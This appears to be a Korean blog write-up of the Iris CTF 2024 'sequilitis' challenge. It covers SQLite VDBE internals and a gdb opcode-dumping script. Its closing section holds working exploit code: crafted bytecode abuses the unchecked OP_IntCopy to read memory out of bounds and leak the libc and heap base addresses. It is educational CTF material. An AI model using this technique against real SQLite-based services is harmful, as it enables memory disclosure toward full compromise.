---
title: "Iris CTF 2024"
dateString: March 2024
draft: false
tags: ["sqlite internals","sqlite exploit","sequilitis","Serious-banking"]
weight: 30
date: 2024-03-10
categories: ["CTF"]
# cover:
    # image: ""
---

DeadSec으로 참여했다. 당시엔 팀원분이 풀어주셔서 넘겼지만, sqlite3라 꼭 혼자 풀어보고싶었다.
# sequilitis
SQL query를 만들고 실행시키는 프로그램이다.
## Analysis
### chal
![](/blog/Iris_CTF_2024/a6c33e5a08a370d06bcf55f97e82cdfb.png)
여러 옵션이 존재한다.
먼저 sqlite3는 오픈소스이고 소스코드도 주어지기 때문에 일단 컴파일을 하고 구조체나 enum을 IDA로 import 했다.
![](/blog/Iris_CTF_2024/55fa6ad447d5d07068c62bc1ef2f357e.png)
inscribe 옵션에서 sqlite3의 vm 코드를 수정할 수 있는 취약점이있다.
![](/blog/Iris_CTF_2024/bbf459f0e1cad640446243885b9313fc.png)
그리고 execute로 실행하고 나면 column type에 따라 값들이 리턴된다.
### sqlite3
sqlite3의 vmcode들을 분석해야한다.
```c
/* forward declaration */
static int sqlite3Prepare(
  sqlite3 *db,              /* Database handle. */
  const char *zSql,         /* UTF-8 encoded SQL statement. */
  int nBytes,               /* Length of zSql in bytes. */
  u32 prepFlags,            /* Zero or more SQLITE_PREPARE_* flags */
  Vdbe *pReprepare,         /* VM being reprepared */
  sqlite3_stmt **ppStmt,    /* OUT: A pointer to the prepared statement */
  const char **pzTail       /* OUT: End of parsed string */
);
```
sqlite3_prepare_v3는 내부적으로 Vdbe 라는 vm 구조체를 초기화하면서 바이트 코드들을 점화한다.
이는 내부적으로 호출되는 함수의 선언부만 봐도 알 수 있다.
```c
struct Vdbe {
  sqlite3 *db;            /* The database connection that owns this statement */
  Vdbe **ppVPrev,*pVNext; /* Linked list of VDBEs with the same Vdbe.db */
  Parse *pParse;          /* Parsing context used to create this Vdbe */
  ynVar nVar;             /* Number of entries in aVar[] */
  int nMem;               /* Number of memory locations currently allocated */
  int nCursor;            /* Number of slots in apCsr[] */
  u32 cacheCtr;           /* VdbeCursor row cache generation counter */
  int pc;                 /* The program counter */
  int rc;                 /* Value to return */
  i64 nChange;            /* Number of db changes made since last reset */
  int iStatement;         /* Statement number (or 0 if has no opened stmt) */
  i64 iCurrentTime;       /* Value of julianday('now') for this statement */
  i64 nFkConstraint;      /* Number of imm. FK constraints this VM */
  i64 nStmtDefCons;       /* Number of def. constraints when stmt started */
  i64 nStmtDefImmCons;    /* Number of def. imm constraints when stmt started */
  Mem *aMem;              /* The memory locations */
  Mem **apArg;            /* Arguments to currently executing user function */
  VdbeCursor **apCsr;     /* One element of this array for each open cursor */
  Mem *aVar;              /* Values for the OP_Variable opcode. */

  /* When allocating a new Vdbe object, all of the fields below should be
  ** initialized to zero or NULL */

  Op *aOp;                /* Space to hold the virtual machine's program */
  int nOp;                /* Number of instructions in the program */
  int nOpAlloc;           /* Slots allocated for aOp[] */
  Mem *aColName;          /* Column names to return */
  Mem *pResultRow;        /* Current output row */
  char *zErrMsg;          /* Error message written here */
  VList *pVList;          /* Name of variables */
#ifndef SQLITE_OMIT_TRACE
  i64 startTime;          /* Time when query started - used for profiling */
#endif
#ifdef SQLITE_DEBUG
  int rcApp;              /* errcode set by sqlite3_result_error_code() */
  u32 nWrite;             /* Number of write operations that have occurred */
#endif
  u16 nResColumn;         /* Number of columns in one row of the result set */
  u16 nResAlloc;          /* Column slots allocated to aColName[] */
  u8 errorAction;         /* Recovery action to do in case of an error */
  u8 minWriteFileFormat;  /* Minimum file format for writable database files */
  u8 prepFlags;           /* SQLITE_PREPARE_* flags */
```
여기서 Op 구조체를 확인하면 다음과 같다.
```c
struct VdbeOp {
  u8 opcode;          /* What operation to perform */
  signed char p4type; /* One of the P4_xxx constants for p4 */
  u16 p5;             /* Fifth parameter is an unsigned 16-bit integer */
  int p1;             /* First operand */
  int p2;             /* Second parameter (often the jump destination) */
  int p3;             /* The third parameter */
  union p4union {     /* fourth parameter */
    int i;                 /* Integer value if p4type==P4_INT32 */
    void *p;               /* Generic pointer */
    char *z;               /* Pointer to data for string (char array) types */
    i64 *pI64;             /* Used when p4type is P4_INT64 */
    double *pReal;         /* Used when p4type is P4_REAL */
    FuncDef *pFunc;        /* Used when p4type is P4_FUNCDEF */
    sqlite3_context *pCtx; /* Used when p4type is P4_FUNCCTX */
    CollSeq *pColl;        /* Used when p4type is P4_COLLSEQ */
    Mem *pMem;             /* Used when p4type is P4_MEM */
    VTable *pVtab;         /* Used when p4type is P4_VTAB */
    KeyInfo *pKeyInfo;     /* Used when p4type is P4_KEYINFO */
    u32 *ai;               /* Used when p4type is P4_INTARRAY */
    SubProgram *pProgram;  /* Used when p4type is P4_SUBPROGRAM */
    Table *pTab;           /* Used when p4type is P4_TABLE */
#ifdef SQLITE_ENABLE_CURSOR_HINTS
    Expr *pExpr;           /* Used when p4type is P4_EXPR */
#endif
  } p4;
#ifdef SQLITE_ENABLE_EXPLAIN_COMMENTS
  char *zComment;          /* Comment to improve readability */
#endif
#ifdef SQLITE_VDBE_COVERAGE
  u32 iSrcLine;            /* Source-code line that generated this opcode
                           ** with flags in the upper 8 bits */
#endif
#if defined(SQLITE_ENABLE_STMT_SCANSTATUS) || defined(VDBE_PROFILE)
  u64 nExec;
  u64 nCycle;
#endif
};
typedef struct VdbeOp VdbeOp;
```
분석 속도를 높히기 위해서 앞서 분석한 내용을 토대로 Ops를 dump하는 스크립트를 작성했다.
#### dump_ops.py
```c
v=  '''OP_Savepoint     =  0#
OP_AutoCommit    =  1#
OP_Transaction   =  2#
OP_Checkpoint    =  3#
OP_JournalMode   =  4#
OP_Vacuum        =  5#
OP_VFilter       =  6# /* jump, synopsis: iplan=r[P3] zplan='P4'     */
OP_VUpdate       =  7# /* synopsis: data=r[P3@P2]                    */
OP_Init          =  8# /* jump, synopsis: Start at P2                */
OP_Goto          =  9# /* jump                                       */
OP_Gosub         = 10# /* jump                                       */
OP_InitCoroutine = 11# /* jump                                       */
OP_Yield         = 12# /* jump                                       */
OP_MustBeInt     = 13# /* jump                                       */
OP_Jump          = 14# /* jump                                       */
OP_Once          = 15# /* jump                                       */
OP_If            = 16# /* jump                                       */
OP_IfNot         = 17# /* jump                                       */
OP_IsType        = 18# /* jump, synopsis: if typeof(P1.P3) in P5 goto P2 */
OP_Not           = 19# /* same as TK_NOT, synopsis: r[P2]= !r[P1]    */
OP_IfNullRow     = 20# /* jump, synopsis: if P1.nullRow then r[P3]=NULL, goto P2 */
OP_SeekLT        = 21# /* jump, synopsis: key=r[P3@P4]               */
OP_SeekLE        = 22# /* jump, synopsis: key=r[P3@P4]               */
OP_SeekGE        = 23# /* jump, synopsis: key=r[P3@P4]               */
OP_SeekGT        = 24# /* jump, synopsis: key=r[P3@P4]               */
OP_IfNotOpen     = 25# /* jump, synopsis: if( !csr[P1] ) goto P2     */
OP_IfNoHope      = 26# /* jump, synopsis: key=r[P3@P4]               */
OP_NoConflict    = 27# /* jump, synopsis: key=r[P3@P4]               */
OP_NotFound      = 28# /* jump, synopsis: key=r[P3@P4]               */
OP_Found         = 29# /* jump, synopsis: key=r[P3@P4]               */
OP_SeekRowid     = 30# /* jump, synopsis: intkey=r[P3]               */
OP_NotExists     = 31# /* jump, synopsis: intkey=r[P3]               */
OP_Last          = 32# /* jump                                       */
OP_IfSmaller     = 33# /* jump                                       */
OP_SorterSort    = 34# /* jump                                       */
OP_Sort          = 35# /* jump                                       */
OP_Rewind        = 36# /* jump                                       */
OP_SorterNext    = 37# /* jump                                       */
OP_Prev          = 38# /* jump                                       */
OP_Next          = 39# /* jump                                       */
OP_IdxLE         = 40# /* jump, synopsis: key=r[P3@P4]               */
OP_IdxGT         = 41# /* jump, synopsis: key=r[P3@P4]               */
OP_IdxLT         = 42# /* jump, synopsis: key=r[P3@P4]               */
OP_Or            = 43# /* same as TK_OR, synopsis: r[P3]=(r[P1] || r[P2]) */
OP_And           = 44# /* same as TK_AND, synopsis: r[P3]=(r[P1] && r[P2]) */
OP_IdxGE         = 45# /* jump, synopsis: key=r[P3@P4]               */
OP_RowSetRead    = 46# /* jump, synopsis: r[P3]=rowset(P1)           */
OP_RowSetTest    = 47# /* jump, synopsis: if r[P3] in rowset(P1) goto P2 */
OP_Program       = 48# /* jump                                       */
OP_FkIfZero      = 49# /* jump, synopsis: if fkctr[P1]==0 goto P2    */
OP_IsNull        = 50# /* jump, same as TK_ISNULL, synopsis: if r[P1]==NULL goto P2 */
OP_NotNull       = 51# /* jump, same as TK_NOTNULL, synopsis: if r[P1]!=NULL goto P2 */
OP_Ne            = 52# /* jump, same as TK_NE, synopsis: IF r[P3]!=r[P1] */
OP_Eq            = 53# /* jump, same as TK_EQ, synopsis: IF r[P3]==r[P1] */
OP_Gt            = 54# /* jump, same as TK_GT, synopsis: IF r[P3]>r[P1] */
OP_Le            = 55# /* jump, same as TK_LE, synopsis: IF r[P3]<=r[P1] */
OP_Lt            = 56# /* jump, same as TK_LT, synopsis: IF r[P3]<r[P1] */
OP_Ge            = 57# /* jump, same as TK_GE, synopsis: IF r[P3]>=r[P1] */
OP_ElseEq        = 58# /* jump, same as TK_ESCAPE                    */
OP_IfPos         = 59# /* jump, synopsis: if r[P1]>0 then r[P1]-=P3, goto P2 */
OP_IfNotZero     = 60# /* jump, synopsis: if r[P1]!=0 then r[P1]--, goto P2 */
OP_DecrJumpZero  = 61# /* jump, synopsis: if (--r[P1])==0 goto P2    */
OP_IncrVacuum    = 62# /* jump                                       */
OP_VNext         = 63# /* jump                                       */
OP_Filter        = 64# /* jump, synopsis: if key(P3@P4) not in filter(P1) goto P2 */
OP_PureFunc      = 65# /* synopsis: r[P3]=func(r[P2@NP])             */
OP_Function      = 66# /* synopsis: r[P3]=func(r[P2@NP])             */
OP_Return        = 67#
OP_EndCoroutine  = 68#
OP_HaltIfNull    = 69# /* synopsis: if r[P3]=null halt               */
OP_Halt          = 70#
OP_Integer       = 71# /* synopsis: r[P2]=P1                         */
OP_Int64         = 72# /* synopsis: r[P2]=P4                         */
OP_String        = 73# /* synopsis: r[P2]='P4' (len=P1)              */
OP_BeginSubrtn   = 74# /* synopsis: r[P2]=NULL                       */
OP_Null          = 75# /* synopsis: r[P2..P3]=NULL                   */
OP_SoftNull      = 76# /* synopsis: r[P1]=NULL                       */
OP_Blob          = 77# /* synopsis: r[P2]=P4 (len=P1)                */
OP_Variable      = 78# /* synopsis: r[P2]=parameter(P1,P4)           */
OP_Move          = 79# /* synopsis: r[P2@P3]=r[P1@P3]                */
OP_Copy          = 80# /* synopsis: r[P2@P3+1]=r[P1@P3+1]            */
OP_SCopy         = 81# /* synopsis: r[P2]=r[P1]                      */
OP_IntCopy       = 82# /* synopsis: r[P2]=r[P1]                      */
OP_FkCheck       = 83#
OP_ResultRow     = 84# /* synopsis: output=r[P1@P2]                  */
OP_CollSeq       = 85#
OP_AddImm        = 86# /* synopsis: r[P1]=r[P1]+P2                   */
OP_RealAffinity  = 87#
OP_Cast          = 88# /* synopsis: affinity(r[P1])                  */
OP_Permutation   = 89#
OP_Compare       = 90# /* synopsis: r[P1@P3] <-> r[P2@P3]            */
OP_IsTrue        = 91# /* synopsis: r[P2] = coalesce(r[P1]==TRUE,P3) ^ P4 */
OP_ZeroOrNull    = 92# /* synopsis: r[P2] = 0 OR NULL                */
OP_Offset        = 93# /* synopsis: r[P3] = sqlite_offset(P1)        */
OP_Column        = 94# /* synopsis: r[P3]=PX cursor P1 column P2     */
OP_TypeCheck     = 95# /* synopsis: typecheck(r[P1@P2])              */
OP_Affinity      = 96# /* synopsis: affinity(r[P1@P2])               */
OP_MakeRecord    = 97# /* synopsis: r[P3]=mkrec(r[P1@P2])            */
OP_Count         = 98# /* synopsis: r[P2]=count()                    */
OP_ReadCookie    = 99#
OP_SetCookie     =100#
OP_ReopenIdx     =101# /* synopsis: root=P2 iDb=P3                   */
OP_BitAnd        =102# /* same as TK_BITAND, synopsis: r[P3]=r[P1]&r[P2] */
OP_BitOr         =103# /* same as TK_BITOR, synopsis: r[P3]=r[P1]|r[P2] */
OP_ShiftLeft     =104# /* same as TK_LSHIFT, synopsis: r[P3]=r[P2]<<r[P1] */
OP_ShiftRight    =105# /* same as TK_RSHIFT, synopsis: r[P3]=r[P2]>>r[P1] */
OP_Add           =106# /* same as TK_PLUS, synopsis: r[P3]=r[P1]+r[P2] */
OP_Subtract      =107# /* same as TK_MINUS, synopsis: r[P3]=r[P2]-r[P1] */
OP_Multiply      =108# /* same as TK_STAR, synopsis: r[P3]=r[P1]*r[P2] */
OP_Divide        =109# /* same as TK_SLASH, synopsis: r[P3]=r[P2]/r[P1] */
OP_Remainder     =110# /* same as TK_REM, synopsis: r[P3]=r[P2]%r[P1] */
OP_Concat        =111# /* same as TK_CONCAT, synopsis: r[P3]=r[P2]+r[P1] */
OP_OpenRead      =112# /* synopsis: root=P2 iDb=P3                   */
OP_OpenWrite     =113# /* synopsis: root=P2 iDb=P3                   */
OP_BitNot        =114# /* same as TK_BITNOT, synopsis: r[P2]= ~r[P1] */
OP_OpenDup       =115#
OP_OpenAutoindex =116# /* synopsis: nColumn=P2                       */
OP_String8       =117# /* same as TK_STRING, synopsis: r[P2]='P4'    */
OP_OpenEphemeral =118# /* synopsis: nColumn=P2                       */
OP_SorterOpen    =119#
OP_SequenceTest  =120# /* synopsis: if( cursor[P1].ctr++ ) pc = P2   */
OP_OpenPseudo    =121# /* synopsis: P3 columns in r[P2]              */
OP_Close         =122#
OP_ColumnsUsed   =123#
OP_SeekScan      =124# /* synopsis: Scan-ahead up to P1 rows         */
OP_SeekHit       =125# /* synopsis: set P2<=seekHit<=P3              */
OP_Sequence      =126# /* synopsis: r[P2]=cursor[P1].ctr++           */
OP_NewRowid      =127# /* synopsis: r[P2]=rowid                      */
OP_Insert        =128# /* synopsis: intkey=r[P3] data=r[P2]          */
OP_RowCell       =129#
OP_Delete        =130#
OP_ResetCount    =131#
OP_SorterCompare =132# /* synopsis: if key(P1)!=trim(r[P3],P4) goto P2 */
OP_SorterData    =133# /* synopsis: r[P2]=data                       */
OP_RowData       =134# /* synopsis: r[P2]=data                       */
OP_Rowid         =135# /* synopsis: r[P2]=PX rowid of P1             */
OP_NullRow       =136#
OP_SeekEnd       =137#
OP_IdxInsert     =138# /* synopsis: key=r[P2]                        */
OP_SorterInsert  =139# /* synopsis: key=r[P2]                        */
OP_IdxDelete     =140# /* synopsis: key=r[P2@P3]                     */
OP_DeferredSeek  =141# /* synopsis: Move P3 to P1.rowid if needed    */
OP_IdxRowid      =142# /* synopsis: r[P2]=rowid                      */
OP_FinishSeek    =143#
OP_Destroy       =144#
OP_Clear         =145#
OP_ResetSorter   =146#
OP_CreateBtree   =147# /* synopsis: r[P2]=root iDb=P1 flags=P3       */
OP_SqlExec       =148#
OP_ParseSchema   =149#
OP_LoadAnalysis  =150#
OP_DropTable     =151#
OP_DropIndex     =152#
OP_Real          =153# /* same as TK_FLOAT, synopsis: r[P2]=P4       */
OP_DropTrigger   =154#
OP_IntegrityCk   =155#
OP_RowSetAdd     =156# /* synopsis: rowset(P1)=r[P2]                 */
OP_Param         =157#
OP_FkCounter     =158# /* synopsis: fkctr[P1]+=P2                    */
OP_MemMax        =159# /* synopsis: r[P1]=max(r[P1],r[P2])           */
OP_OffsetLimit   =160# /* synopsis: if r[P1]>0 then r[P2]=r[P1]+max(0,r[P3]) else r[P2]=(-1) */
OP_AggInverse    =161# /* synopsis: accum=r[P3] inverse(r[P2@P5])    */
OP_AggStep       =162# /* synopsis: accum=r[P3] step(r[P2@P5])       */
OP_AggStep1      =163# /* synopsis: accum=r[P3] step(r[P2@P5])       */
OP_AggValue      =164# /* synopsis: r[P3]=value N=P2                 */
OP_AggFinal      =165# /* synopsis: accum=r[P1] N=P2                 */
OP_Expire        =166#
OP_CursorLock    =167#
OP_CursorUnlock  =168#
OP_TableLock     =169# /* synopsis: iDb=P1 root=P2 write=P3          */
OP_VBegin        =170#
OP_VCreate       =171#
OP_VDestroy      =172#
OP_VOpen         =173#
OP_VCheck        =174#
OP_VInitIn       =175# /* synopsis: r[P2]=ValueList(P1,P3)           */
OP_VColumn       =176# /* synopsis: r[P3]=vcolumn(P2)                */
OP_VRename       =177#
OP_Pagecount     =178#
OP_MaxPgcnt      =179#
OP_ClrSubtype    =180# /* synopsis: r[P1].subtype = 0                */
OP_FilterAdd     =181# /* synopsis: filter(P1) += key(P3@P4)         */
OP_Trace         =182#
OP_CursorHint    =183#
OP_ReleaseReg    =184# /* synopsis: release r[P1@P2] mask P3         */
OP_Noop          =185#
OP_Explain       =186#
OP_Abortable     =187#
'''
import gdb
import struct
opcode = {}
for i,j in enumerate(v.split('\n')):
    opcode[i] = j.split()[0]
    if i == 187:
        break
gdb.execute('brva 0x88E1')
gdb.execute('c')
rdi = (gdb.parse_and_eval('*(int64_t *)($rdi+0x88)'))
inf = gdb.selected_inferior()
while True:
    mem = bytes(inf.read_memory(rdi, 0x18))
    p4_type = mem[1]
    p5 = struct.unpack('<H',mem[2:4])[0]
    p1 = struct.unpack('<I',mem[4:8])[0]
    p2 = struct.unpack('<I',mem[8:12])[0]
    p3 = struct.unpack('<I',mem[12:16])[0]
    p4 = struct.unpack('<Q',mem[16:24])[0]
    print("{")
    print('\tOPCODE =',opcode[mem[0]])
    print('\tp5 =',p5)
    print('\tp4_type =',p4_type)
    print('\tp4 =',hex(p4))
    print('\tp1 =',hex(p1))
    print('\tp2 =',hex(p2))
    print('\tp3 =',hex(p3))
    print("}")
    rdi += 0x18

    if mem[0] == 70:
        break
```
위 스크립트를 이용해서 몇가지 SQL에 대한 바이트 코드가 어떻게 점화되는지 확인했다.
```c
SELECT 0x1234

gef> source dump_ops.py 
{
        OPCODE = OP_Init
        p5 = 0
        p4_type = 0
        p4 = 0x0
        p1 = 0x0
        p2 = 0x4
        p3 = 0x0
}
{
        OPCODE = OP_Integer
        p5 = 0
        p4_type = 0
        p4 = 0x0
        p1 = 0x1244566
        p2 = 0x1
        p3 = 0x0
}
{
        OPCODE = OP_ResultRow
        p5 = 0
        p4_type = 0
        p4 = 0x0
        p1 = 0x1
        p2 = 0x1
        p3 = 0x0
}
{
        OPCODE = OP_Halt
        p5 = 0
        p4_type = 0
        p4 = 0x0
        p1 = 0x0
        p2 = 0x0
        p3 = 0x0
}
```
OP_Init은 초기화 작업을 해주고 p2에 저장된 entrypoint로 뛰어주는 역할을 한다.
그리고 OP_ResultRow로 ResultRow를 지정한다.
마지막으로 OP_Halt로 vm 프로그램을 종료한다.

이러한 바이트 코드들은 sqlite3_step 내부에서 실행된다.
최종적으로 sqlite3VdbeExec이 호출된다.
```c
SQLITE_PRIVATE int sqlite3VdbeExec(
  Vdbe *p                    /* The VDBE */
){
  Op *aOp = p->aOp;          /* Copy of p->aOp */
  Op *pOp = aOp;             /* Current operation */
#ifdef SQLITE_DEBUG
  Op *pOrigOp;               /* Value of pOp at the top of the loop */
  int nExtraDelete = 0;      /* Verifies FORDELETE and AUXDELETE flags */
  u8 iCompareIsInit = 0;     /* iCompare is initialized */
#endif
  int rc = SQLITE_OK;        /* Value to return */
  sqlite3 *db = p->db;       /* The database */
  u8 resetSchemaOnFault = 0; /* Reset schema after an error if positive */
  u8 encoding = ENC(db);     /* The database encoding */
  int iCompare = 0;          /* Result of last comparison */
  u64 nVmStep = 0;           /* Number of virtual machine steps */
#ifndef SQLITE_OMIT_PROGRESS_CALLBACK
  u64 nProgressLimit;        /* Invoke xProgress() when nVmStep reaches this */
#endif
  Mem *aMem = p->aMem;       /* Copy of p->aMem */
  Mem *pIn1 = 0;             /* 1st input operand */
  Mem *pIn2 = 0;             /* 2nd input operand */
  Mem *pIn3 = 0;             /* 3rd input operand */
  Mem *pOut = 0;             /* Output operand */
  u32 colCacheCtr = 0;       /* Column cache counter */
#if defined(SQLITE_ENABLE_STMT_SCANSTATUS) || defined(VDBE_PROFILE)
  u64 *pnCycle = 0;
  int bStmtScanStatus = IS_STMT_SCANSTATUS(db)!=0;
#endif
  /*** INSERT STACK UNION HERE ***/

  assert( p->eVdbeState==VDBE_RUN_STATE );  /* sqlite3_step() verifies this */
  if( DbMaskNonZero(p->lockMask) ){
    sqlite3VdbeEnter(p);
  }
#ifndef SQLITE_OMIT_PROGRESS_CALLBACK
  if( db->xProgress ){
    u32 iPrior = p->aCounter[SQLITE_STMTSTATUS_VM_STEP];
    assert( 0 < db->nProgressOps );
    nProgressLimit = db->nProgressOps - (iPrior % db->nProgressOps);
  }else{
    nProgressLimit = LARGEST_UINT64;
  }
#endif
  if( p->rc==SQLITE_NOMEM ){
    /* This happens if a malloc() inside a call to sqlite3_column_text() or
    ** sqlite3_column_text16() failed.  */
    goto no_mem;
  }
  assert( p->rc==SQLITE_OK || (p->rc&0xff)==SQLITE_BUSY );
  testcase( p->rc!=SQLITE_OK );
  p->rc = SQLITE_OK;
  assert( p->bIsReader || p->readOnly!=0 );
  p->iCurrentTime = 0;
  assert( p->explain==0 );
  db->busyHandler.nBusy = 0;
  if( AtomicLoad(&db->u1.isInterrupted) ) goto abort_due_to_interrupt;
  sqlite3VdbeIOTraceSql(p);
#ifdef SQLITE_DEBUG
  sqlite3BeginBenignMalloc();
  if( p->pc==0
   && (p->db->flags & (SQLITE_VdbeListing|SQLITE_VdbeEQP|SQLITE_VdbeTrace))!=0
  ){
    int i;
    int once = 1;
    sqlite3VdbePrintSql(p);
    if( p->db->flags & SQLITE_VdbeListing ){
      printf("VDBE Program Listing:\n");
      for(i=0; i<p->nOp; i++){
        sqlite3VdbePrintOp(stdout, i, &aOp[i]);
      }
    }
    if( p->db->flags & SQLITE_VdbeEQP ){
      for(i=0; i<p->nOp; i++){
        if( aOp[i].opcode==OP_Explain ){
          if( once ) printf("VDBE Query Plan:\n");
          printf("%s\n", aOp[i].p4.z);
          once = 0;
        }
      }
    }
    if( p->db->flags & SQLITE_VdbeTrace )  printf("VDBE Trace:\n");
  }
  sqlite3EndBenignMalloc();
#endif
  for(pOp=&aOp[p->pc]; 1; pOp++){
    /* Errors are detected by individual opcodes, with an immediate
    ** jumps to abort_due_to_error. */
    assert( rc==SQLITE_OK );

    assert( pOp>=aOp && pOp<&aOp[p->nOp]);
    nVmStep++;

#if defined(VDBE_PROFILE)
    pOp->nExec++;
    pnCycle = &pOp->nCycle;
    if( sqlite3NProfileCnt==0 ) *pnCycle -= sqlite3Hwtime();
#elif defined(SQLITE_ENABLE_STMT_SCANSTATUS)
    if( bStmtScanStatus ){
      pOp->nExec++;
      pnCycle = &pOp->nCycle;
      *pnCycle -= sqlite3Hwtime();
    }
#endif

    /* Only allow tracing if SQLITE_DEBUG is defined.
    */
#ifdef SQLITE_DEBUG
    if( db->flags & SQLITE_VdbeTrace ){
      sqlite3VdbePrintOp(stdout, (int)(pOp - aOp), pOp);
      test_trace_breakpoint((int)(pOp - aOp),pOp,p);
    }
#endif


    /* Check to see if we need to simulate an interrupt.  This only happens
    ** if we have a special test build.
    */
#ifdef SQLITE_TEST
    if( sqlite3_interrupt_count>0 ){
      sqlite3_interrupt_count--;
      if( sqlite3_interrupt_count==0 ){
        sqlite3_interrupt(db);
      }
    }
#endif

    /* Sanity checking on other operands */
#ifdef SQLITE_DEBUG
    {
      u8 opProperty = sqlite3OpcodeProperty[pOp->opcode];
      if( (opProperty & OPFLG_IN1)!=0 ){
        assert( pOp->p1>0 );
        assert( pOp->p1<=(p->nMem+1 - p->nCursor) );
        assert( memIsValid(&aMem[pOp->p1]) );
        assert( sqlite3VdbeCheckMemInvariants(&aMem[pOp->p1]) );
        REGISTER_TRACE(pOp->p1, &aMem[pOp->p1]);
      }
      if( (opProperty & OPFLG_IN2)!=0 ){
        assert( pOp->p2>0 );
        assert( pOp->p2<=(p->nMem+1 - p->nCursor) );
        assert( memIsValid(&aMem[pOp->p2]) );
        assert( sqlite3VdbeCheckMemInvariants(&aMem[pOp->p2]) );
        REGISTER_TRACE(pOp->p2, &aMem[pOp->p2]);
      }
      if( (opProperty & OPFLG_IN3)!=0 ){
        assert( pOp->p3>0 );
        assert( pOp->p3<=(p->nMem+1 - p->nCursor) );
        assert( memIsValid(&aMem[pOp->p3]) );
        assert( sqlite3VdbeCheckMemInvariants(&aMem[pOp->p3]) );
        REGISTER_TRACE(pOp->p3, &aMem[pOp->p3]);
      }
      if( (opProperty & OPFLG_OUT2)!=0 ){
        assert( pOp->p2>0 );
        assert( pOp->p2<=(p->nMem+1 - p->nCursor) );
        memAboutToChange(p, &aMem[pOp->p2]);
      }
      if( (opProperty & OPFLG_OUT3)!=0 ){
        assert( pOp->p3>0 );
        assert( pOp->p3<=(p->nMem+1 - p->nCursor) );
        memAboutToChange(p, &aMem[pOp->p3]);
      }
    }
#endif
#ifdef SQLITE_DEBUG
    pOrigOp = pOp;
#endif

    switch( pOp->opcode ){

/*****************************************************************************
** What follows is a massive switch statement where each case implements a
** separate instruction in the virtual machine.  If we follow the usual
** indentation conventions, each case should be indented by 6 spaces.  But
** that is a lot of wasted space on the left margin.  So the code within
** the switch statement will break with convention and be flush-left. Another
** big comment (similar to this one) will mark the point in the code where
** we transition back to normal indentation.
**
** The formatting of each case is important.  The makefile for SQLite
** generates two C files "opcodes.h" and "opcodes.c" by scanning this
** file looking for lines that begin with "case OP_".  The opcodes.h files
** will be filled with #defines that give unique integer values to each
** opcode and the opcodes.c file is filled with an array of strings where
** each string is the symbolic name for the corresponding opcode.  If the
** case statement is followed by a comment of the form "/# same as ... #/"
** that comment is used to determine the particular value of the opcode.
**
** Other keywords in the comment that follows each case are used to
** construct the OPFLG_INITIALIZER value that initializes opcodeProperty[].
** Keywords include: in1, in2, in3, out2, out3.  See
** the mkopcodeh.awk script for additional information.
**
** Documentation about VDBE opcodes is generated by scanning this file
** for lines of that contain "Opcode:".  That line and all subsequent
** comment lines are used in the generation of the opcode.html documentation
** file.
**
** SUMMARY:
**
**     Formatting is important to scripts that scan this file.
**     Do not deviate from the formatting style currently in use.
**
*****************************************************************************/

/* Opcode:  Goto * P2 * * *
**
** An unconditional jump to address P2.
** The next instruction executed will be
** the one at index P2 from the beginning of
** the program.
**
** The P1 parameter is not actually used by this opcode.  However, it
** is sometimes set to 1 instead of 0 as a hint to the command-line shell
** that this Goto is the bottom of a loop and that the lines from P2 down
** to the current line should be indented for EXPLAIN output.
*/
case OP_Goto: {             /* jump */

#ifdef SQLITE_DEBUG
  /* In debugging mode, when the p5 flags is set on an OP_Goto, that
  ** means we should really jump back to the preceding OP_ReleaseReg
  ** instruction. */
  if( pOp->p5 ){
    assert( pOp->p2 < (int)(pOp - aOp) );
    assert( pOp->p2 > 1 );
    pOp = &aOp[pOp->p2 - 2];
    assert( pOp[1].opcode==OP_ReleaseReg );
    goto check_for_interrupt;
  }
#endif
```
이런식으로 Opcode에 따라 switch case로 처리한다.

## Exploitation
먼저 악용할만한 opcode를 먼저 찾으려고 주석으로 달린 synopsis를 읽었다.
```c
OP_Copy          = 80# /* synopsis: r[P2@P3+1]=r[P1@P3+1]            */
OP_SCopy         = 81# /* synopsis: r[P2]=r[P1]                      */
OP_IntCopy       = 82# /* synopsis: r[P2]=r[P1]     
```
Copy 계열 명령어를 보다가 IntCopy를 쓰기로 결정했다.
```c
/* Opcode: IntCopy P1 P2 * * *
** Synopsis: r[P2]=r[P1]
**
** Transfer the integer value held in register P1 into register P2.
**
** This is an optimized version of SCopy that works only for integer
** values.
*/
case OP_IntCopy: {            /* out2 */
  pIn1 = &aMem[pOp->p1];
  assert( (pIn1->flags & MEM_Int)!=0 );
  pOut = &aMem[pOp->p2];
  sqlite3VdbeMemSetInt64(pOut, pIn1->u.i);
  break;
}
```
기본적으로 prepare로 점화된 바이트 코드를 신뢰하기 때문에 별도의 boundary check가 없다.
그래서 memory에 대한 Out of bound read가 가능해진다.
```c
struct sqlite3_value
{
  MemValue u;
  char *z;
  int n;
  u16 flags;
  u8 enc;
  u8 eSubtype;
  sqlite3 *db;
  int szMalloc;
  u32 uTemp;
  char *zMalloc;
  void (*xDel)(void *);
};
```
그런데 약간 성가신게 메모리 배열의 하나의 원소가 sqlite3_value라서 0x38의 배수 단위로만 메모리 액세스가 가능했다.
### mem_dump.py
실제 메모리 구조체의 첫 8바이트만 액세스가 가능하니 유효한 주소를 유출할 수 있도록 0x38의 배수 단위로 탐색을 진행했다.
```python
import gdb
import struct
y = int(input('base sqliteMem: '),16)
inf = gdb.selected_inferior()
for i in range(200):
    mem = struct.unpack('<Q',inf.read_memory(y-0x38*i, 0x8))
    print(hex(y-0x38*i) + f'({-i})' +' : ' + hex(mem[0]))
```

### Memory leak
```python
payload = b'SELECT '
for i in range(0x20):
  payload += f'(SELECT {i}),'.encode()
payload = payload[:-1]
prepare(1,payload)
pc = 1
payload = compile(OP_Init, 0, pc) # jmp to pc
payload += compile(OP_Integer,0x1, 1)
payload += compile(OP_IntCopy, (-146)&0xffffffff, 1)
payload += compile(OP_ResultRow, 1, 1) # p2 = col count
payload += compile(OP_Halt)
modify_opcode(1, payload)
exec_q(1)

libc_base = int(p.recvuntil(b' ')[:-1]) - 0x21ace0
log.success(hex(libc_base))
'''
OP_SCopy         = 81# /* synopsis: r[P2]=r[P1]                      */
OP_IntCopy       = 82# /* synopsis: r[P2]=r[P1]                      */
'''

payload = compile(OP_Init, 0, pc) # jmp to pc
payload += compile(OP_Integer,0x1, 1)
payload += compile(OP_IntCopy, (-0xb8)&0xffffffff, 1)
payload += compile(OP_ResultRow, 1, 1) # p2 = col count
payload += compile(OP_Halt)
modify_opcode(1, payload)
exec_q(1)
heap_base = int(p.recvuntil(b' ')[:-1])-0x14578
log.success(hex(heap_base))

```
